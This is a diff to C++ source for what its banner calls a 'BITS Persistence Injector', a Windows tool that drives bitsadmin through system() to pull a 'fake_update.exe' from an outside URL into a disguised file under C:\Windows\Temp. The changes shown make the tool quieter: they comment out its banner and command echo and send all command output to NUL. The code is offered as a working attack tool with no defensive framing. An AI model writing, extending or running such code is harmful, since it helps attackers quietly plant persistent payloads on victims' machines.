@@ -9,12 +9,13 @@ const std::string FAKE_URL = "https://hackingarticles.in/fake_update.exe";
 const std::string TEMP_DEST = "C:\\Windows\\Temp\\bits_cache.tmp";
 
 void ExecuteCommand(std::string cmd) {
-    std::cout << "[*] Executing: " << cmd << std::endl;
-    system(cmd.c_str());
+    //std::cout << "[*] Executing: " << cmd << std::endl;
+    std::string silencedCmd = cmd + " > NUL 2>&1";
+    system(silencedCmd.c_str());
 }
 
 int main() {
-    std::cout << "--- BITS Persistence Injector ---" << std::endl;
+    //std::cout << "--- BITS Persistence Injector ---" << std::endl;
 
     // 1. Clean up any existing job with the same name to avoid collisions
     ExecuteCommand("bitsadmin /cancel " + JOB_NAME);
